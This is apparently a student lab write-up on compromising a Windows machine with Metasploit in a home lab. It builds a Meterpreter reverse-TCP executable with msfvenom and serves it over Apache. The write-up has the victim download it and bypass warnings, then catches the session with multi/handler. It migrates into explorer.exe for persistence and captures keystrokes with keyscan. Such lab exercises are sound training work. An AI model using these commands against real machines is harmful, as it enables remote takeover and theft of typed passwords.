# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit
```
NAME: SANJAY S
REG.NO: 212223040184
```

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## OUTPUT:

![Screenshot 2025-04-23 231505](https://github.com/user-attachments/assets/366085f9-9355-4b6e-a9d5-eddce3a17cef)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## Output

![Screenshot 2025-04-23 234602](https://github.com/user-attachments/assets/12172145-5ee1-4baa-bba9-44b99fb41c47)

copy the fun.exe into the apache /var/www/html folder

![Screenshot 2025-04-23 234612](https://github.com/user-attachments/assets/654dbc15-70c8-4009-8e79-07e54ac7967c)

Start apache server sudo systemctl apache2 start

![Screenshot 2025-04-23 234617](https://github.com/user-attachments/assets/17a731b8-06c7-45d9-b24d-9c6ea652f966)

Check the status of apache2

![Screenshot 2025-04-23 234710](https://github.com/user-attachments/assets/d726d5a1-18b3-4af3-872a-9cd842705320)

## Output:

![Screenshot 2025-04-23 231846](https://github.com/user-attachments/assets/b63927bc-8631-4e08-8fc0-67b50ebc2a9f)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![Screenshot 2025-04-23 235303](https://github.com/user-attachments/assets/e20ecfd2-220b-4578-8ba6-6083215a1117)

Starting a command and control Server use multi/handler
![Screenshot 2025-04-23 235431](https://github.com/user-attachments/assets/ec0bda09-1683-443f-b735-05c14a922c31)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.220.129/fun.exe The file "fun.exe" downloads.

![Screenshot 2025-04-23 235454](https://github.com/user-attachments/assets/abe01f92-87ad-432d-9ebe-33b53401d9a3)


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![Screenshot 2025-04-24 000012](https://github.com/user-attachments/assets/2d0f4282-85a8-49e0-810a-5d2b096e5d83)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![Screenshot 2025-04-24 000031](https://github.com/user-attachments/assets/48fdbae6-feb7-4322-877c-83f4038e5951)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![Screenshot 2025-04-24 000052](https://github.com/user-attachments/assets/b8b5e358-55f6-4956-849d-c9ffa3ca016c)

keyscan_dump Shows the keystrokes captured so far

![Screenshot 2025-04-24 000105](https://github.com/user-attachments/assets/1b2abe7f-e44c-42b5-9d24-97415685cecb)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
